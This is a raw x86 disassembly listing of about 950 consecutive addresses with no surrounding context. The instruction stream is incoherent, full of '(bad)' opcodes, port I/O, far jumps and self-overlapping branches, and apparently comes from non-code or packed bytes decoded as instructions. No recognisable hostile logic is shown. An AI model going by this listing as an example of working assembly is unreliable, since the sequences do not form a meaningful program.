  4195dc:	bound  ebp,QWORD PTR [edi-0x4c4b1229]
  4195e2:	adc    ebp,edx
  4195e4:	fild   DWORD PTR [esi]
  4195e6:	retf   
  4195e7:	sbb    al,0x17
  4195e9:	outs   dx,DWORD PTR ds:[esi]
  4195ea:	push   esi
  4195eb:	xchg   esp,eax
  4195ec:	cmp    BYTE PTR [eax+0x3f],0xda
  4195f0:	mov    bh,cl
  4195f2:	mov    esp,0x79a9afe
  4195f7:	jns    0x41958f
  4195f9:	ja     0x41961f
  4195fb:	xchg   ebx,eax
  4195fc:	cli    
  4195fd:	test   DWORD PTR [ebp-0x23239b25],eax
  419603:	xchg   edx,eax
  419604:	mov    eax,0x292b15f0
  419609:	adc    eax,0x6840bb53
  41960e:	arpl   WORD PTR [ecx-0x7],sp
  419611:	or     eax,0x4cb12256
  419616:	xchg   DWORD PTR [esi],edx
  419618:	xor    eax,0x42465668
  41961d:	inc    ebx
  41961e:	outs   dx,BYTE PTR ds:[esi]
  41961f:	fmul   QWORD PTR [ebx]
  419621:	lods   al,BYTE PTR ds:[esi]
  419622:	or     edi,0x7c6224e2
  419628:	mov    esp,0x5bdc7c99
  41962d:	mov    bl,0xd0
  41962f:	(bad)  
  419631:	(bad)  
  419632:	mov    ebp,ebx
  419634:	jns    0x4195c8
  419636:	jmp    0x419628
  419638:	outs   dx,BYTE PTR ds:[esi]
  419639:	adc    eax,0x6fe403a7
  41963e:	fidiv  WORD PTR [edi+0x248eb5a5]
  419644:	xor    al,0x4f
  419646:	outs   dx,BYTE PTR ds:[esi]
  419647:	jbe    0x41967b
  419649:	add    eax,0x6f2f7e5d
  41964e:	inc    edx
  41964f:	neg    BYTE PTR [esi-0x7ca7f25]
  419655:	xor    DWORD PTR [edx-0x69],esp
  419658:	xor    ecx,DWORD PTR [ebx-0x50]
  41965b:	loop   0x419675
  41965d:	loope  0x419612
  41965f:	in     al,0xfa
  419661:	in     eax,dx
  419662:	mov    edx,0xe297a357
  419667:	(bad)  [eax+0x6e]
  41966a:	dec    esp
  41966b:	mov    ds:0x574e0226,al
  419670:	mov    ebx,0x8f8a4c32
  419675:	stos   BYTE PTR es:[edi],al
  419676:	aam    0x3b
  419678:	or     al,dh
  41967a:	xchg   ecx,eax
  41967b:	xor    BYTE PTR [esi-0x5b],ah
  41967e:	sub    edi,DWORD PTR ds:0x818a4f3f
  419684:	aad    0xda
  419686:	xor    al,0x46
  419688:	pop    edi
  419689:	mov    edx,0x34939ab7
  41968e:	jmp    0x3371:0x720bbd33
  419695:	inc    esp
  419696:	daa    
  419697:	pop    ebx
  419698:	push   esi
  419699:	or     ecx,DWORD PTR ds:0x4cc72aca
  41969f:	or     bh,BYTE PTR [ebp-0x71cfba95]
  4196a5:	push   ebx
  4196a6:	into   
  4196a7:	mov    ch,BYTE PTR [edi+0x38cb3eef]
  4196ad:	push   ss
  4196ae:	mov    edx,edx
  4196b0:	and    al,0x5e
  4196b2:	lahf   
  4196b3:	(bad)  
  4196b4:	mov    esi,0x337cc48e
  4196b9:	mov    esp,0x1ee15b1a
  4196be:	add    DWORD PTR [ebp-0x2f],0x4e3b7ebd
  4196c5:	std    
  4196c6:	call   0x3122:0x52da22a2
  4196cd:	aam    0xc8
  4196cf:	sbb    edx,DWORD PTR [esi-0x6f85b4ff]
  4196d5:	sbb    DWORD PTR [esi],edi
  4196d7:	outs   dx,BYTE PTR ds:[esi]
  4196d8:	pop    eax
  4196d9:	fsubr  DWORD PTR ds:0xe1be7d3
  4196df:	inc    esp
  4196e0:	xor    eax,0x9e966de0
  4196e5:	stos   DWORD PTR es:[edi],eax
  4196e6:	and    BYTE PTR [edi],0x6d
  4196e9:	adc    dl,BYTE PTR [edx+eiz*2-0x58dee37d]
  4196f0:	xor    ebx,eax
  4196f2:	inc    edx
  4196f3:	test   BYTE PTR [ebp+0x7f],ah
  4196f6:	loopne 0x41969a
  4196f8:	pop    ebx
  4196f9:	shr    BYTE PTR [esi-0xb],0x9a
  4196fd:	jne    0x4196af
  4196ff:	sbb    al,0xf7
  419701:	xor    DWORD PTR [ebp-0x12],ebp
  419704:	int    0xbf
  419706:	stc    
  419707:	mov    BYTE PTR [esi+ecx*8-0x38412a2b],0xfb
  41970f:	xor    dh,BYTE PTR [edx+0x6867b60e]
  419715:	or     BYTE PTR [ebx-0x3acebf38],0x28
  41971c:	test   al,0x32
  41971e:	jb     0x419767
  419720:	je     0x4196ac
  419722:	inc    eax
  419723:	sub    bl,cl
  419725:	mov    al,ds:0x3521b78e
  41972a:	sahf   
  41972b:	std    
  41972c:	xchg   ebp,eax
  41972d:	rol    bl,1
  41972f:	sub    ebx,DWORD PTR [esi-0x4f]
  419732:	jmp    0x419798
  419734:	push   eax
  419735:	cmc    
  419736:	enter  0x67e2,0xd2
  41973a:	ins    DWORD PTR es:[edi],dx
  41973b:	pop    esp
  41973c:	scas   eax,DWORD PTR es:[edi]
  41973d:	adc    cl,BYTE PTR [ebp-0x1ef26907]
  419743:	adc    dh,ch
  419745:	jb     0x41979f
  419747:	jmp    0x4197ab
  419749:	pop    ecx
  41974a:	icebp  
  41974b:	sbb    DWORD PTR ds:0xb8b26cd8,ebp
  419751:	fs out 0xf8,al
  419754:	push   edi
  419755:	push   edi
  419756:	mov    ds:0xe06e878,al
  41975b:	and    eax,0x2ff6f1ee
  419760:	cld    
  419761:	jmp    0x88ab9084
  419766:	push   esi
  419767:	add    bh,BYTE PTR [esi+0x7536a451]
  41976d:	mov    eax,0xc823ab7a
  419772:	pusha  
  419773:	cld    
  419774:	iret   
  419775:	pop    ecx
  419776:	mov    ah,bh
  419778:	pop    esi
  419779:	mov    BYTE PTR [eax+0x44273b12],dl
  41977f:	test   al,0xe6
  419781:	fs jg  0x41974c
  419784:	out    dx,eax
  419785:	jno    0x4197e7
  419787:	xlat   BYTE PTR ds:[ebx]
  419788:	push   edi
  419789:	mov    eax,ds:0x46171fd4
  41978e:	fidiv  DWORD PTR [ecx+0x20dbff68]
  419794:	int3   
  419795:	js     0x41973c
  419797:	xor    DWORD PTR [ebp+0x69],ebx
  41979a:	hlt    
  41979b:	das    
  41979c:	jnp    0x41972a
  41979e:	iret   
  41979f:	pop    esp
  4197a0:	test   DWORD PTR [esi],ebp
  4197a2:	sbb    dh,bh
  4197a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197a5:	or     edi,DWORD PTR [edx]
  4197a7:	frndint 
  4197a9:	stos   BYTE PTR es:[edi],al
  4197aa:	iret   
  4197ab:	out    0xad,al
  4197ad:	leave  
  4197ae:	cmc    
  4197af:	xor    BYTE PTR [edx+0x45f1910c],bl
  4197b5:	aaa    
  4197b6:	stos   DWORD PTR es:[edi],eax
  4197b7:	call   0x2986958d
  4197bc:	adc    bh,BYTE PTR [ecx]
  4197be:	add    edi,DWORD PTR [esp+ebx*8-0x72fad90f]
  4197c5:	mov    dl,0xeb
  4197c7:	(bad)  
  4197c9:	mov    eax,0x45fd3b81
  4197ce:	mov    ch,BYTE PTR [eax+0x234404da]
  4197d4:	test   DWORD PTR [esi-0x2b],edi
  4197d7:	sbb    BYTE PTR [ebp-0x7a6e72c9],dl
  4197dd:	stc    
  4197de:	pushf  
  4197df:	dec    edi
  4197e0:	inc    ebp
  4197e1:	sub    dh,BYTE PTR [ecx-0x73a59e07]
  4197e7:	popf   
  4197e8:	and    DWORD PTR [esi],ecx
  4197ea:	jno    0x4197bf
  4197ec:	ds mov bl,0xb3
  4197ef:	outs   dx,BYTE PTR ds:[esi]
  4197f0:	ja     0x4197f9
  4197f2:	push   esp
  4197f3:	inc    ecx
  4197f4:	add    edi,DWORD PTR [ebx+0x36]
  4197f7:	popf   
  4197f8:	add    edx,DWORD PTR [ebx]
  4197fa:	repnz xchg ebp,eax
  4197fc:	push   edx
  4197fd:	push   0xffffff93
  4197ff:	jecxz  0x41981c
  419801:	jae    0x41985d
  419803:	mov    al,ds:0x6a607a56
  419808:	rol    BYTE PTR [ecx],0xc8
  41980b:	sbb    eax,0xbf21be6a
  419810:	fadd   st(6),st
  419812:	ret    0xa88d
  419815:	in     al,dx
  419816:	cmp    dl,dh
  419818:	inc    eax
  419819:	add    bl,bl
  41981b:	jg     0x4197cc
  41981d:	cmp    DWORD PTR [esi+0x59c0c365],ecx
  419823:	das    
  419824:	push   0xffffff90
  419826:	pop    esi
  419827:	loop   0x419892
  419829:	jo     0x41988c
  41982b:	inc    eax
  41982c:	aas    
  41982d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41982e:	fs (bad) 
  419831:	icebp  
  419832:	jb     0x4198a7
  419834:	or     eax,0xfbbbb770
  419839:	xchg   esi,eax
  41983a:	lods   eax,DWORD PTR ds:[esi]
  41983b:	aaa    
  41983c:	cmp    al,0x90
  41983e:	push   ss
  41983f:	sbb    ecx,ebp
  419841:	xor    DWORD PTR [ebp+0x55c7bdae],ecx
  419847:	cld    
  419848:	mov    ebp,0x91b3110a
  41984d:	sub    BYTE PTR [ecx],0x88
  419850:	and    ch,BYTE PTR [ebp-0x70f86fdc]
  419856:	push   0xffffffbd
  419858:	in     al,0xdb
  41985a:	test   DWORD PTR [eax+edi*4+0xda0dc8c],eax
  419861:	sub    dh,BYTE PTR [esi+0x1e]
  419864:	adc    BYTE PTR [eax+0x5677c19e],ch
  41986a:	cmp    BYTE PTR [esp+ebp*4-0x6d],0x5d
  41986f:	dec    ebp
  419870:	(bad)  
  419871:	test   al,0xee
  419873:	int    0x7d
  419875:	pop    edi
  419876:	(bad)  
  419877:	xchg   edx,eax
  419878:	sahf   
  419879:	jecxz  0x41987a
  41987b:	dec    edi
  41987c:	icebp  
  41987d:	sub    eax,0xbe5e1336
  419882:	mov    eax,ds:0x10da384a
  419887:	dec    esp
  419888:	shl    DWORD PTR [edx-0x3],cl
  41988b:	call   0x3513:0xbc0b6e9f
  419892:	jnp    0x419840
  419894:	sbb    edx,edx
  419896:	add    al,0xb6
  419898:	cs out 0x64,al
  41989b:	jle    0x4198c3
  41989d:	out    dx,eax
  41989e:	cmp    al,0xb1
  4198a0:	lahf   
  4198a1:	inc    edi
  4198a2:	xchg   BYTE PTR [esi],al
  4198a4:	dec    ecx
  4198a5:	mov    BYTE PTR [eax-0x72dd6124],dh
  4198ab:	addr16 es test al,0xbc
  4198af:	push   esp
  4198b0:	rol    BYTE PTR [ebp+0x53],1
  4198b3:	and    cl,BYTE PTR [edi-0x5e]
  4198b6:	add    al,0x2a
  4198b8:	js     0x419861
  4198ba:	std    
  4198bb:	int    0x9e
  4198bd:	dec    ebp
  4198be:	pop    ecx
  4198bf:	mov    ds:0x58c58616,eax
  4198c4:	inc    edi
  4198c5:	dec    edi
  4198c6:	call   0x63757f5b
  4198cb:	popa   
  4198cc:	jl     0x4198a9
  4198ce:	test   eax,0x9ee806fc
  4198d3:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4198d5:	mov    esi,0xc3fa8bf9
  4198da:	pop    ecx
  4198db:	mov    esp,0xc6402a39
  4198e0:	les    esp,FWORD PTR [edx+ebp*8-0x3c]
  4198e4:	out    dx,al
  4198e5:	stos   BYTE PTR es:[edi],al
  4198e6:	mov    esi,0x955f05d4
  4198eb:	call   0x7b06:0xfb5ff3cd
  4198f2:	(bad)  
  4198f3:	pop    ebx
  4198f4:	call   0xd65eec59
  4198f9:	xor    bh,BYTE PTR [ecx-0x56]
  4198fc:	pushf  
  4198fd:	es cmp al,0xe6
  419900:	sub    DWORD PTR [ecx-0x2ecd3aa2],ebp
  419906:	hlt    
  419907:	lods   eax,DWORD PTR ds:[esi]
  419908:	rol    ebp,1
  41990a:	adc    al,0x8d
  41990c:	mov    bh,0x8f
  41990e:	or     ebx,DWORD PTR [esi]
  419910:	(bad)  
  419911:	jne    0x4198b9
  419913:	test   DWORD PTR [edx+0x25fe94c6],ecx
  419919:	or     edx,DWORD PTR ds:0x314f6a62
  41991f:	mov    eax,ds:0x3b42de4f
  419924:	repnz mov ah,0xb6
  419927:	pop    edx
  419928:	mov    eax,0x99565256
  41992d:	cmp    edi,DWORD PTR [eax+0x69d1923c]
  419933:	inc    edi
  419934:	mov    dl,0xf5
  419936:	loopne 0x419932
  419938:	mov    dl,0x9e
  41993a:	icebp  
  41993b:	ds cmp bh,al
  41993e:	push   eax
  41993f:	jl     0x419971
  419941:	cmp    cl,ah
  419943:	je     0x4198f1
  419945:	jmp    0xe475:0xda24bbc6
  41994c:	ss push edi
  41994e:	sbb    ecx,DWORD PTR [edx-0x11]
  419951:	jle    0x41994a
  419953:	sbb    ah,cl
  419955:	pop    ds
  419956:	clc    
  419957:	sbb    BYTE PTR [ecx],ch
  419959:	inc    esi
  41995a:	jmp    0x419996
  41995c:	inc    esi
  41995d:	fdivr  st,st(6)
  41995f:	cmp    dh,BYTE PTR [ebx-0x7931d1cd]
  419965:	mov    al,0x2a
  419967:	fcmovnbe st,st(0)
  419969:	lds    ebx,FWORD PTR [ebx+eax*2]
  41996c:	test   BYTE PTR [edx-0x2d],ah
  41996f:	outs   dx,DWORD PTR ds:[esi]
  419970:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419971:	inc    esp
  419972:	fcmove st,st(1)
  419974:	stc    
  419975:	imul   edx,ebx,0xd376cceb
  41997b:	pop    ecx
  41997c:	fsub   st,st(4)
  41997e:	sti    
  41997f:	add    al,bh
  419981:	loope  0x419979
  419983:	mov    WORD PTR ds:0x3b32044e,es
  419989:	bound  edi,QWORD PTR [ebx]
  41998b:	or     DWORD PTR [esi+0x669bf7e3],ecx
  419991:	mov    dh,0xfe
  419993:	fsubrp st(1),st
  419995:	push   edx
  419996:	ss jae 0x419a03
  419999:	push   0x41
  41999b:	mov    cl,0x2d
  41999d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41999e:	adc    al,0x94
  4199a0:	jp     0x419985
  4199a2:	leave  
  4199a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199a4:	mov    esp,0xea922267
  4199a9:	inc    edx
  4199aa:	mov    BYTE PTR [ecx+0x36],bl
  4199ad:	dec    ebx
  4199ae:	ret    0xed6c
  4199b1:	mov    bh,0x7
  4199b3:	cmp    al,0x80
  4199b5:	and    DWORD PTR [ecx-0x52],eax
  4199b8:	in     eax,dx
  4199b9:	inc    esp
  4199ba:	jmp    0x95e31f26
  4199bf:	clc    
  4199c0:	cmp    al,BYTE PTR [esi]
  4199c2:	xor    eax,0xd1880f08
  4199c7:	inc    ebp
  4199c8:	idiv   bl
  4199ca:	inc    ebx
  4199cb:	adc    eax,0xcb087a8d
  4199d0:	push   ebp
  4199d1:	jns    0x419a4e
  4199d3:	push   eax
  4199d4:	(bad)  
  4199d5:	dec    edx
  4199d6:	ins    DWORD PTR es:[edi],dx
  4199d7:	push   0xfffffff6
  4199d9:	rol    BYTE PTR [ecx],1
  4199db:	lea    ebp,[ebp+0x12]
  4199de:	fmulp  st(2),st
  4199e0:	sbb    eax,DWORD PTR [eax-0x489d6daf]
  4199e6:	aam    0xd2
  4199e8:	mov    ebp,0x66205a79
  4199ed:	jg     0x4199de
  4199ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199f0:	lods   al,BYTE PTR ds:[esi]
  4199f1:	sub    eax,0x313ce369
  4199f6:	out    0x41,al
  4199f8:	and    eax,0x60185dac
  4199fd:	stc    
  4199fe:	shl    DWORD PTR [esi+eiz*2],1
  419a01:	jge    0x4199a1
  419a03:	das    
  419a04:	and    DWORD PTR [edx-0x62de4870],ecx
  419a0a:	cmp    ebp,edx
  419a0c:	inc    esi
  419a0d:	add    dl,bh
  419a0f:	into   
  419a10:	inc    edi
  419a11:	aam    0xc7
  419a13:	mov    edx,0xb61de11a
  419a18:	nop
  419a19:	jecxz  0x419a92
  419a1b:	adc    al,0xb1
  419a1d:	xor    dh,BYTE PTR ds:0xdece72e7
  419a23:	sub    ah,BYTE PTR [ebx]
  419a25:	pop    edx
  419a26:	std    
  419a27:	in     al,0x4c
  419a29:	xchg   ebp,eax
  419a2a:	push   ebx
  419a2b:	mov    edx,ss
  419a2d:	imul   ebp,DWORD PTR [edx+0x55],0x6d
  419a31:	sub    BYTE PTR [ecx+esi*1-0x62ab3457],bh
  419a38:	xor    ebx,ebp
  419a3a:	shl    DWORD PTR [edi+0x66],1
  419a3d:	adc    esp,esp
  419a3f:	push   eax
  419a40:	pop    edx
  419a41:	aam    0xbc
  419a43:	scas   al,BYTE PTR es:[edi]
  419a44:	test   DWORD PTR ds:0xc1629c5c,edx
  419a4a:	test   BYTE PTR [eax+0xd253d10],0x42
  419a51:	xor    ch,BYTE PTR [edi-0x9]
  419a54:	(bad)  
  419a55:	daa    
  419a56:	(bad)  
  419a57:	dec    edi
  419a58:	scas   eax,DWORD PTR es:[edi]
  419a59:	dec    esp
  419a5a:	sub    al,0x7e
  419a5c:	fs aaa 
  419a5e:	les    ecx,FWORD PTR [edi]
  419a60:	xchg   edx,eax
  419a61:	jb     0x419a60
  419a63:	mov    bl,dh
  419a65:	jle    0x419a0d
  419a67:	dec    edx
  419a68:	jmp    0x89d5:0xa39f1800
  419a6f:	inc    ebx
  419a70:	cmp    DWORD PTR [esi],edi
  419a72:	cli    
  419a73:	sbb    eax,0xceb7c87a
  419a78:	stc    
  419a79:	pop    gs
  419a7b:	std    
  419a7c:	enter  0x371e,0x64
  419a80:	fsubr  QWORD PTR [edi-0x30]
  419a83:	xor    DWORD PTR [edx+eiz*1-0x6],eax
  419a87:	add    DWORD PTR [ebx+ebp*1-0xdabf3a],ebx
  419a8e:	jae    0x419a89
  419a90:	sahf   
  419a91:	repnz sub BYTE PTR [esi+0x44bddbf6],cl
  419a98:	pop    ebp
  419a99:	int3   
  419a9a:	jbe    0x419a5b
  419a9c:	pop    esi
  419a9d:	int    0x5c
  419a9f:	imul   edx,DWORD PTR [esi+esi*1],0xffffff8b
  419aa3:	ss pop ds
  419aa5:	daa    
  419aa6:	mov    fs,WORD PTR [ecx+0x7d]
  419aa9:	scas   al,BYTE PTR es:[edi]
  419aaa:	cmp    ebp,DWORD PTR [ebx-0x1a]
  419aad:	mov    ebx,0xb63d54fa
  419ab2:	mov    BYTE PTR [edi+eax*1+0x79],ah
  419ab6:	inc    ebp
  419ab7:	inc    eax
  419ab8:	jg     0x419ac2
  419aba:	push   edx
  419abb:	pop    ss
  419abc:	jl     0x419b0a
  419abe:	sbb    edi,esi
  419ac0:	xchg   ebp,eax
  419ac1:	stc    
  419ac2:	push   edx
  419ac3:	dec    ebx
  419ac4:	mov    ecx,?
  419ac6:	imul   edx,DWORD PTR [edx+0x3e286f12],0xffffffd2
  419acd:	shl    DWORD PTR [eax-0x25],1
  419ad0:	in     al,dx
  419ad1:	jmp    0x419add
  419ad3:	adc    esi,DWORD PTR [ecx+edx*2]
  419ad6:	test   BYTE PTR [ebx-0x71b001b2],bl
  419adc:	int3   
  419add:	pushf  
  419ade:	arpl   WORD PTR [edx+ebx*1+0x5a],sp
  419ae2:	ja     0x419af2
  419ae4:	and    DWORD PTR fs:[ebx+0x14],eax
  419ae8:	inc    edx
  419ae9:	(bad)  
  419aea:	call   0x8fa1:0xe3e4425a
  419af1:	lods   eax,DWORD PTR ds:[esi]
  419af2:	push   es
  419af3:	push   0x61
  419af5:	add    ch,BYTE PTR [ebx+0x5c]
  419af8:	xchg   edi,eax
  419af9:	mov    ecx,0x7bc7c761
  419afe:	mov    bl,0x78
  419b00:	cmp    al,0x4f
  419b02:	in     al,dx
  419b03:	mov    cl,0x82
  419b05:	jne    0x419aad
  419b07:	and    eax,0x6f97c4ba
  419b0c:	imul   edx,DWORD PTR [ecx+0x26],0x4c
  419b10:	ja     0x419b52
  419b12:	jo     0x419b0f
  419b14:	lea    edx,[ecx]
  419b16:	test   DWORD PTR [ebp+0xf],edx
  419b19:	pop    esp
  419b1a:	adc    DWORD PTR [ebx-0x205bb91a],ebx
  419b20:	int3   
  419b21:	test   eax,0x7add210
  419b26:	scas   al,BYTE PTR es:[edi]
  419b27:	lds    esi,FWORD PTR [esi-0x332661e5]
  419b2d:	dec    ecx
  419b2e:	outs   dx,BYTE PTR ds:[esi]
  419b2f:	fsubr  st,st(6)
  419b31:	ror    BYTE PTR [eax],1
  419b33:	sub    al,0x70
  419b35:	test   DWORD PTR [ebx],0xfc00c91f
  419b3b:	cli    
  419b3c:	push   edx
  419b3d:	into   
  419b3e:	out    0x92,eax
  419b40:	je     0x419b8e
  419b42:	jo     0x419b37
  419b44:	mov    ds:0xf9e5185e,eax
  419b49:	aad    0xe8
  419b4b:	out    0xe3,al
  419b4d:	push   ebx
  419b4e:	push   eax
  419b4f:	mov    esi,0x9cc34e72
  419b54:	or     al,0x22
  419b56:	pop    ebp
  419b57:	out    0x63,eax
  419b59:	outs   dx,BYTE PTR ds:[esi]
  419b5a:	loop   0x419b6f
  419b5c:	ins    BYTE PTR es:[edi],dx
  419b5d:	jbe    0x419af1
  419b5f:	into   
  419b60:	daa    
  419b61:	push   0xffffff90
  419b63:	adc    al,dl
  419b65:	retf   0x3a8b
  419b68:	test   BYTE PTR [edi+0x37],bl
  419b6b:	aas    
  419b6c:	push   edx
  419b6d:	(bad)  
  419b6f:	sbb    eax,0x6f5a70d3
  419b74:	stc    
  419b75:	bswap  ecx
  419b77:	hlt    
  419b78:	jae    0x419afa
  419b7a:	js     0x419b1e
  419b7c:	xchg   ebx,eax
  419b7d:	inc    ecx
  419b7e:	out    0xc5,eax
  419b80:	aam    0xdc
  419b82:	xor    BYTE PTR [ecx-0xd011fef],ch
  419b88:	lods   eax,DWORD PTR ds:[esi]
  419b89:	aaa    
  419b8a:	in     al,dx
  419b8b:	mov    ch,0x14
  419b8d:	xchg   ah,cl
  419b8f:	xchg   esi,eax
  419b90:	aam    0xc4
  419b92:	enter  0xab93,0x6
  419b96:	fst    DWORD PTR [edi+0x47eeb7a4]
  419b9c:	mov    BYTE PTR [ecx],ah
  419b9e:	(bad)  
  419b9f:	jmp    0xec4f:0xe5f29ee5
  419ba6:	adc    al,0x67
  419ba8:	mov    bl,0xe9
  419baa:	or     BYTE PTR [ebx+0xc180063],ah
  419bb0:	push   0x63b1c4cc
  419bb5:	popf   
  419bb6:	ins    DWORD PTR es:[edi],dx
  419bb7:	sti    
  419bb8:	and    ebp,DWORD PTR [ebp-0x36]
  419bbb:	jge    0x419b7d
  419bbd:	sub    bl,BYTE PTR [esi-0x1f8b388c]
  419bc3:	or     eax,0x1aafee11
  419bc8:	mov    dh,0xdb
  419bca:	call   0x4d0abac3
  419bcf:	fld    TBYTE PTR [ebx-0x4e]
  419bd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bd3:	mov    ds:0xbfeee511,eax
  419bd8:	rcl    DWORD PTR [edi-0x2a],0xc8
  419bdc:	mov    edx,0xf5f9a101
  419be1:	ins    DWORD PTR es:[edi],dx
  419be2:	dec    esi
  419be3:	sti    
  419be4:	or     al,BYTE PTR [esi+eiz*8+0xfaf88bd]
  419beb:	dec    ebx
  419bec:	inc    ebx
  419bed:	je     0x419c38
  419bef:	mov    ss,ebx
  419bf1:	or     eax,0x1cffa526
  419bf6:	pop    ss
  419bf7:	rcr    bh,1
  419bf9:	push   ss
  419bfa:	(bad)  
  419bfb:	push   0xffffffe7
  419bfd:	pusha  
  419bfe:	mov    dh,0x81
  419c00:	dec    ecx
  419c01:	not    ebp
  419c03:	jge    0x419c1f
  419c05:	mov    cl,0xac
  419c07:	mov    ebp,0x1c2862c
  419c0c:	fdiv   DWORD PTR [ecx-0x17]
  419c0f:	jbe    0x419c35
  419c11:	pop    edx
  419c12:	mov    dl,0x3a
  419c14:	jbe    0x419c90
  419c16:	cmp    eax,0xcd5b79d6
  419c1b:	inc    esp
  419c1c:	jecxz  0x419c81
  419c1e:	loopne 0x419bb2
  419c20:	cli    
  419c21:	add    BYTE PTR [ecx+0x71],cl
  419c24:	addr16 inc ecx
  419c26:	push   ebx
  419c27:	mov    esp,0x1f84277
  419c2c:	mov    ebp,0xd35f0cf8
  419c31:	cmp    BYTE PTR [edx+ebx*4],0x25
  419c35:	neg    BYTE PTR [eax]
  419c37:	loop   0x419bf7
  419c39:	mov    dl,0x6
  419c3b:	jecxz  0x419c71
  419c3d:	retf   
  419c3e:	push   cs
  419c3f:	popf   
  419c40:	pop    edx
  419c41:	fiadd  WORD PTR [ebp+esi*8-0x2]
  419c45:	inc    esi
  419c46:	mov    dl,0x34
  419c48:	mov    ebx,ecx
  419c4a:	xor    al,cl
  419c4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c4d:	addr16 clc 
  419c4f:	xchg   esp,eax
  419c50:	leave  
  419c51:	loope  0x419c8b
  419c53:	mov    al,ds:0x5bb912b7
  419c58:	push   es
  419c59:	es push 0x9
  419c5c:	pop    ebx
  419c5e:	sub    edx,DWORD PTR [ecx+0x26]
  419c61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c62:	sub    BYTE PTR [esi+0x4a],bh
  419c65:	dec    DWORD PTR es:[edx+esi*4+0x9]
  419c6a:	push   0xffffffd0
  419c6c:	fidiv  WORD PTR [ebp+0x6520d06d]
  419c72:	add    al,0xc0
  419c74:	out    0xb2,al
  419c76:	mov    dh,0xba
  419c78:	sti    
  419c79:	(bad)  
  419c7a:	push   0xffffffad
  419c7c:	inc    esi
  419c7d:	sub    eax,0x29d70ed3
  419c82:	jnp    0x419c55
  419c84:	out    dx,al
  419c85:	mov    esi,0x45e0fd95
  419c8a:	pop    ebx
  419c8b:	push   edx
  419c8c:	and    ebx,DWORD PTR ds:0xb003fce4
  419c92:	daa    
  419c93:	inc    eax
  419c94:	sub    DWORD PTR ds:0x47e4d2fc,ecx
  419c9a:	mov    eax,ds:0x273f7d86
  419c9f:	inc    edi
  419ca0:	fdivr  QWORD PTR [ebp+esi*4-0x7c]
  419ca4:	fistp  WORD PTR [esi-0x3a27280e]
  419caa:	imul   ebp,DWORD PTR [ebx-0x1e],0x5f4de88f
  419cb1:	mov    eax,0x9ca6df48
  419cb6:	and    DWORD PTR [ebp-0x1f],edx
  419cb9:	adc    ecx,ebp
  419cbb:	ins    DWORD PTR es:[edi],dx
  419cbc:	adc    dh,ah
  419cbe:	test   ch,dl
  419cc0:	pushf  
  419cc1:	sub    BYTE PTR [esi+0x30490cec],dh
  419cc7:	dec    esp
  419cc8:	mov    al,ds:0x178cc4ea
  419ccd:	dec    edi
  419cce:	idiv   BYTE PTR [eax+edi*2+0x44]
  419cd2:	ficomp DWORD PTR [ecx-0x60]
  419cd5:	mov    edx,0xf1f79c21
  419cda:	lods   eax,DWORD PTR ds:[esi]
  419cdb:	call   FWORD PTR [eax]
  419cdd:	mov    ds:0xf8a16f48,al
  419ce2:	das    
  419ce3:	mov    edi,0x757ce2f4
  419ce8:	fst    DWORD PTR [esi+0x3e236215]
  419cee:	sbb    ah,bh
  419cf0:	ret    0x55af
  419cf3:	mov    ds:0x5ad39f18,eax
  419cf8:	nop
  419cf9:	std    
  419cfa:	pop    edi
  419cfb:	adc    eax,0xad7a588a
  419d00:	in     eax,dx
  419d01:	repz in al,0x6
  419d04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d05:	jo     0x419cf7
  419d07:	jg     0x419d3c
  419d09:	cmp    eax,0xe73e0ec6
  419d0e:	cld    
  419d0f:	lea    eax,[esi+0x4505b9cd]
  419d15:	ret    
  419d16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d17:	hlt    
  419d18:	std    
  419d19:	stos   DWORD PTR es:[edi],eax
  419d1a:	inc    ebp
  419d1b:	mov    bh,0xbd
  419d1d:	sub    eax,0xb78a29f1
  419d22:	jl     0x419cd6
  419d24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d25:	cmp    ch,BYTE PTR [edi]
  419d27:	(bad)  es:[ecx-0x4d5bdde6]
  419d2e:	cmp    eax,0xf26f76da
  419d33:	loopne 0x419da6
  419d35:	xchg   edx,eax
  419d36:	push   esp
  419d37:	outs   dx,DWORD PTR ds:[esi]
  419d38:	fs push 0x5d45f1b5
  419d3e:	xchg   ebp,eax
  419d3f:	cli    
  419d40:	jg     0x419cda
  419d42:	hlt    
  419d43:	adc    DWORD PTR ds:0xb9ed8476,eax
  419d49:	xor    al,0xfa
  419d4b:	ins    DWORD PTR es:[edi],dx
  419d4c:	push   cs
  419d4d:	es pop ecx
  419d4f:	retf   0x8118
  419d52:	les    ebp,FWORD PTR [edx]
  419d54:	das    
  419d55:	mov    ah,0xf4
  419d57:	cmp    ecx,DWORD PTR [esi-0x7b60b71d]
  419d5d:	and    DWORD PTR [ebx-0x64e6bcf3],edi
  419d63:	ds cmp al,0x7f
  419d66:	es nop
  419d68:	and    DWORD PTR [esp+ebp*4+0x7b],edx
  419d6c:	xchg   esi,eax
  419d6d:	test   BYTE PTR [ebx*1+0x886a689],ah
  419d74:	pop    esi
  419d75:	cmc    
  419d76:	dec    edi
  419d77:	clc    
  419d78:	(bad)  
  419d79:	dec    edi
  419d7a:	add    BYTE PTR [esi],ch
  419d7c:	fsubr  QWORD PTR [edi-0x61]
  419d7f:	jae    0x419d17
  419d81:	inc    ecx
  419d82:	push   cs
  419d83:	pushf  
  419d84:	retf   0xa74c
  419d87:	sub    BYTE PTR [ecx-0x31c2cc07],bh
  419d8d:	xor    BYTE PTR [ebx-0x5b],al
  419d90:	sar    DWORD PTR [edi+eiz*1-0x6bfd015e],cl
  419d97:	mov    ch,0x1f
  419d99:	pushf  
  419d9a:	test   eax,0x9b1484b6
  419d9f:	mov    ebx,ebp
  419da1:	sub    BYTE PTR ds:0x2286a497,dh
  419da7:	clc    
  419da8:	push   esi
  419da9:	stc    
